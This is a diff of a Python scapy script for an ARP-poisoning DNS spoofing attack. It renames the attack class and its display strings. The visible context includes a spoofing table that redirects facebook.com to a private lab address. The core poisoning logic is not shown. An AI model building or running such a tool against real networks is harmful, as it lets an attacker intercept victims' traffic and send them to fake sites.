@@ -3,7 +3,6 @@ import scapy.all as scapy
 import sys, time, multiprocessing
 import netifaces as ni
 
-
 # Constants
 DIVIDER = '=' * 60
 POISON_BREAK = 30
@@ -17,9 +16,9 @@ dns_hosts = {
     b"facebook.com.": "10.0.2.6"
 }
 
-# ARP Man in the Middle DNS Spoofing Attack
-class ARPMITMDNSSpoofing():
-    # Constructs the ARP Man in the Middle DNS Spoofing Attack
+# ARP DNS Spoofing Attack
+class ARPDNSSpoofing():
+    # Constructs the ARP DNS Spoofing Attack
     def __init__(self, victimIP, interface):
         # Disables verbosity (command line) mode
         scapy.conf.verb = 0
@@ -45,11 +44,11 @@ class ARPMITMDNSSpoofing():
 
     # Returns interactive prompt string
     def __repr__(self):
-        return 'ARPMITMDNSPoisoning({}, {})'.format(self.victimIP, self.interface)
+        return 'ARPDNSPoisoning({}, {})'.format(self.victimIP, self.interface)
 
     # Returns string representation
     def __str__(self):
-        return 'ARP Man in the Middle DNS Poisoning on {}:\n - Victim IP {} at {}'.format(
+        return 'ARP DNS Poisoning on {}:\n - Victim IP {} at {}'.format(
                 self.interface, self.victimIP, self.victimMac)
 
     # Print Initialization Message
